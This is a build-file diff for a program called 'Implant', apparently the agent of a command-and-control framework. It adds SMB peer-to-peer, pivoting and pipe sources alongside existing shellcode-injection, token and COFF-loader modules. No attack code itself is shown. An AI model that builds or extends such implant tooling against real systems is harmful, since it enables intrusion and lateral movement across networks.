@@ -4,7 +4,6 @@ project(Implant)
 
 set(CMAKE_CXX_STANDARD 17)
 set(CMAKE_CXX_STANDARD_REQUIRED ON)
-set(CMAKE_CXX_COMPILER /usr/bin/x86_64-w64-mingw32-g++)
 
 include_directories(
     include
@@ -20,6 +19,10 @@ add_executable(Implant
     src/Implant/ImplantExecute.cpp
     src/Implant/ImplantJob.cpp
     src/Implant/ImplantTransport.cpp
+
+    # peer-to-peer
+    src/Peer/Peer.cpp
+    src/Peer/Smb.cpp
 
     # channel
     #
@@ -42,6 +45,7 @@ add_executable(Implant
     src/Command/CommandInlineExecute.cpp
     src/Command/CommandInjectShellcode.cpp
     src/Command/CommandToken.cpp
+    src/Command/CommandPivot.cpp
 
     # coff loader
     #
@@ -49,11 +53,12 @@ add_executable(Implant
     src/Coff/CoffLoader.cpp
     src/Coff/CoffRelocations.cpp
 
-    # stdlib
     #
+    # stdlib
     src/Stdlib/Base64.cpp
     src/Stdlib/Fs.cpp
     src/Stdlib/String.cpp
+    src/Stdlib/Pipe.cpp
 )
 
 target_link_options(Implant PRIVATE
@@ -69,6 +74,15 @@ set(DEFAULT_CHANNEL_CONFIG "{0x0}" CACHE STRING "default channel config")
 
 target_compile_definitions(Implant PRIVATE "DEFAULT_CHANNEL_CONFIG=${DEFAULT_CHANNEL_CONFIG}")
 target_compile_definitions(Implant PRIVATE "DEFAULT_CHANNEL=${DEFAULT_CHANNEL}")
+
+# Debug mode
+# target_compile_options(Implant PRIVATE -g -gcodeview)
+# target_link_options(Implant PRIVATE
+#     -fuse-ld=lld
+#     -g
+#     -Wl,-Bstatic -lstdc++ -lwinpthread -Wl,-Bdynamic
+#     -Wl,--pdb=$<TARGET_FILE_DIR:Implant>/$<TARGET_FILE_BASE_NAME:Implant>.pdb
+# )
 
 target_link_libraries(Implant PRIVATE
     ntdll
